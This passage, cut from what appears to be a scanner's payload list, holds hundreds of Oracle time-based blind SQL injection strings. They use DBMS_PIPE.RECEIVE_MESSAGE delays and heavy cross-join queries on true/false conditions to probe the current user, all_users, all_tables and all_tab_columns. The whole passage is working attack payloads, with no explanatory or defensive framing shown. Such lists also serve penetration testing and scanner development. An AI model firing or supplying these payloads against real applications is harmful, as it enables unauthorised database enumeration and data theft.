(SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr011',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr012',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr012',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr012',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr012',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr012',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr013',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr013',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr013',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr013',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr013',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr014',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr014',1) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr014',1) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr014',1) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr014',1) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr015',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1=2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr015',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr015',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr015',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr015',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr016',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 1=1 AND 1=2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr016',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr016',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr016',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN 1<>2 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr016',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr017',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN 2<1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr017',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr017',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr017',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN 2>1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr017',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr018',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN USER IS NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr018',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr018',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr018',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN USER IS NOT NULL THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr018',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr019',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN LENGTH(USER)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr019',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr019',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr019',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN LENGTH(USER)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr019',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr020',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr020',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr020',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr020',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr020',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr021',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROWNUM<-1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr021',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr021',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr021',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN ROWNUM>=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr021',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr022',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN NOT EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr022',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr022',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr022',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN EXISTS(SELECT 1 FROM DUAL) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr022',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr023',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr023',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr023',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr023',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT SUM(1) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr023',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr024',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN MOD(5,2)=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr024',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr024',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr024',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN MOD(5,2)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr024',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr025',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN POWER(2,2)=5 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr025',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr025',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr025',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN POWER(2,2)=4 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr025',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr026',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ROUND(3.14159,2)<3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr026',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr026',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr026',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN ROUND(3.14159,2)>3 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr026',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr027',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr027',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr027',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr027',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN ASCII(SUBSTR(USER,1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr027',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr028',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr028',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr028',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr028',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr028',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr029',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)<0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr029',2) ELSE 0 END FROM DUAL)>=0-- -", "' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr029',2) ELSE 0 END FROM DUAL)>=0-- -", " AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr029',2) ELSE 0 END FROM DUAL)>=0-- -", " OR (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqr029',2) ELSE 0 END FROM DUAL)>=0-- -", "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', "' AND CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", "' AND CASE WHEN LENGTH(USER)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", "' OR CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -", ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', ' OR CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<500) ELSE 0 END>0-- -', "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', "' AND CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", "' AND CASE WHEN LENGTH(USER)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", "' OR CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -", ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', ' OR CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<1000) ELSE 0 END>0-- -', "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', "' AND CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", "' AND CASE WHEN LENGTH(USER)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", "' OR CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -", ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', ' OR CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<2000) ELSE 0 END>0-- -', "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', "' AND CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", "' AND CASE WHEN LENGTH(USER)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", "' OR CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -", ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', ' OR CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<5000) ELSE 0 END>0-- -', "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', "' AND CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", "' AND CASE WHEN LENGTH(USER)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", "' OR CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -", ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE 